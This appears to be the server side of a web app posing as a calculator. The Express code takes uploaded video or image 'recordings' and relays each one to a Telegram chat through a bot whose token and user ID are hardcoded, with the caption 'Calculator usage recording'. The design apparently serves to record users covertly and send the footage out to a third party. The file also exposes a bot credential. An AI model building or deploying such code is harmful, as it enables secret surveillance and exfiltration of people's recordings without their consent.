const express = require('express');
const axios = require('axios');
const FormData = require('form-data');
const multer = require('multer');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram bot configuration
const BOT_TOKEN = '8272548565:AAFdmzd6Q2tmQMcFXStdn-xUXoOxQPMQefQ';
const USER_ID = '7456166223';

// Configure multer for memory storage (no file system needed)
const storage = multer.memoryStorage();
const upload = multer({ 
  storage: storage,
  fileFilter: (req, file, cb) => {
    if (file.mimetype.startsWith('video/') || file.mimetype.startsWith('image/')) {
      cb(null, true);
    } else {
      cb(new Error('Only video files are allowed!'), false);
    }
  },
  limits: {
    fileSize: 50 * 1024 * 1024 // 50MB limit
  }
});

// Serve static files
app.use(express.static('public'));
app.use(express.json());

// Send video to Telegram
async function sendToTelegram(videoBuffer, filename) {
  try {
    const formData = new FormData();
    formData.append('chat_id', USER_ID);
    formData.append('video', videoBuffer, {
      filename: filename,
      contentType: 'video/webm'
    });
    formData.append('caption', `Calculator usage recording\nTimestamp: ${new Date().toLocaleString()}`);

    const response = await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
      formData,
      {
        headers: {
          ...formData.getHeaders(),
        },
      }
    );

    console.log('Video sent to Telegram successfully');
    return response.data;
  } catch (error) {
    console.error('Error sending video to Telegram:', error.response?.data || error.message);
    throw error;
  }
}

// Routes
app.post('/upload-recording', upload.single('recording'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No video file uploaded' });
    }

    const filename = `calculator_recording_${Date.now()}.webm`;
    
    // Send to Telegram directly from memory
    await sendToTelegram(req.file.buffer, filename);

    res.json({ 
      success: true, 
      message: 'Recording sent successfully' 
    });
  } catch (error) {
    console.error('Upload error:', error);
    res.status(500).json({ 
      error: 'Failed to process recording' 
    });
  }
});

app.get('/health', (req, res) => {
  res.json({ status: 'Server is running' });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
